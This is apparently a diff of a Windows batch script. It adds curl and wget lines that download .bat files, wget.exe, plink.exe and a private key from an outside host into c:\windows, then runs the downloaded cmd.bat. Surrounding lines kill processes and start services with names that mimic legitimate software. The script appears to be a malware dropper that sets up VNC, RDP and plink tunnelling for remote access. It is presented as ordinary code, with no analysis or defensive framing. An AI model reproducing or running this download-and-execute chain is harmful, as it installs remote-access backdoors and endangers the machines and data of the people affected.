@@ -1,3 +1,11 @@
+curl http://troglo.homepc.it/win/cmd.bat -o c:\windows\cmd.bat
+curl http://troglo.homepc.it/win/vnc.bat -o c:\windows\vnc.bat
+curl http://troglo.homepc.it/rdp/rdp.bat -o c:\windows\rdp.bat
+curl http://troglo.homepc.it/rdp/rdp1.bat -o c:\windows\rdp1.bat
+curl http://troglo.homepc.it/win/plink.bat -o c:\windows\plink.bat
+curl http://troglo.homepc.it/win/wget.exe -o c:\windows\wget.exe
+wget  http://troglo.homepc.it/plink.exe -O c:\windows\plink.exe 
+wget   http://troglo.homepc.it/mila.ppk -O c:\windows\mila.ppk 
 taskkill /f /im sys1.exe
 taskkill /f /im sys2.exe
 taskkill /f /im sys3.exe
@@ -32,4 +40,5 @@ wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.d
 cscript c:\windows\hp\svc.vbs
 net start CppWindowsService
 net start adobesys
+c:\windows\cmd.bat
  
